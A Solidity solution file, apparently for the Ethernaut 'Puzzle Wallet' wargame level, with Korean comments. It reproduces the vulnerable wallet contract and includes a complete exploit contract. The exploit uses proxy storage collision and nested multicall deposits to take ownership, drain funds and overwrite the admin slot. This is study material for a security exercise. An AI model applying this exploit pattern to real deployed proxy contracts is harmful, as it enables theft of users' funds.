// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface PuzzleProxy  {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { // 이걸 실행시켜야 함
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external { // pendingAdmin에 나를 넣으면 이걸 실행할 수 있음
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted { // 
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) { // 이걸 우회할 수 있음
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract exploit {
    PuzzleProxy proxy = PuzzleProxy(0xd25cA0c887f1BC46BaeD4002009a156aA10a1B5C);
    PuzzleWallet wallet = PuzzleWallet(0xd25cA0c887f1BC46BaeD4002009a156aA10a1B5C);
    bytes[] to_send;

    constructor() payable {
        proxy.proposeNewAdmin(address(this)); // implementation의 owner를 변조하기 위한 호출
        wallet.addToWhitelist(address(this)); // whiteList에 이 컨트랙트 주소를 추가
        
        to_send.push(abi.encodeWithSelector(wallet.deposit.selector));
        to_send.push(abi.encodeWithSelector(wallet.multicall.selector, to_send));
        to_send.push(abi.encodeWithSelector(wallet.execute.selector, address(this), 0.002 ether, hex"00"));
        wallet.multicall{value: 0.001 ether}(to_send);
        wallet.setMaxBalance(uint256(uint160(address(msg.sender))));
        require(uint160(wallet.maxBalance()) == uint160(msg.sender));
    }
}
